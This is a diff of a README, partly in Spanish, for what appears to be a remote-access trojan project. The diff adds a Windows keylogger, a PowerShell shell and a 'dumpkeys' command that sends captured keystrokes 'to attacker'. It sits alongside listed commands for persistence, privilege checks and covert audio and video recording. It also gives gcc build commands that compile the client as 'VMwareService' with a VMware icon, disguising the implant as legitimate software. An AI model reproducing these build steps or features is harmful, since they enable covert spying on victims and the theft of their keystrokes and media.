@@ -28,9 +28,18 @@ En desarollo...
 
 # News
 
+## Better Windows Shell
+
+- A wonderfull PowerShell shell.
+
+
+## Keylogger
+
+- A new keylogger has been added on Windows.
+
 ### Code optimization
 
-The code has been optmized, some functions like download/upload has been fixed to download data/binary.
+- The code has been optmized, some functions like download/upload has been fixed to download data/binary.
 
 ### Functions to record video & audio.
 
@@ -54,8 +63,9 @@ Por el momento tenemos disponible los siguientes comandos:
     - lowpersistence  -> Set persistence (no root)
     - peristence      -> Set persistence (root needed)
     - check           -> List privileges
-    - record          -> Take a 10s audio [ONLY WINDOWS]
+    - record          -> Take a 10s audio
     - video           -> Take a 10s video (720p) [ONLY LINUX]
+    - dumpkeys        -> Send to attacker de keys log
     - q / exit        -> Exit server
     - q -y / exit -y  -> Exit server and client (close binary) 
 
@@ -102,10 +112,10 @@ Modificamos el archivo **[src/mainFuctsWin.c](src/mainFuctsWin.c)** especificand
 
 - [Cliente](Windows/client.c) + **VMWARE ICON**:
 
-      gcc -mwindows .\clientWin.c -o .\dist\VMwareService -lws2_32 -lShlwapi -lwinmm ../src/icon.o
+      gcc -mwindows .\clientWin.c -o .\dist\VMwareService -lws2_32 -lShlwapi -lwinmm -lpthread ../src/icon.o
 - [Cliente](Windows/client.c):
 
-      gcc -mwindows .\clientWin.c -o .\dist\VMwareService -lws2_32 -lShlwapi -lwinmm
+      gcc -mwindows .\clientWin.c -o .\dist\VMwareService -lws2_32 -lShlwapi -lwinmm -lpthread
 - [Server](Windows/server.c):
 
       gcc .\serverWin.c -o .\dist\server -lws2_32 -lShlwapi
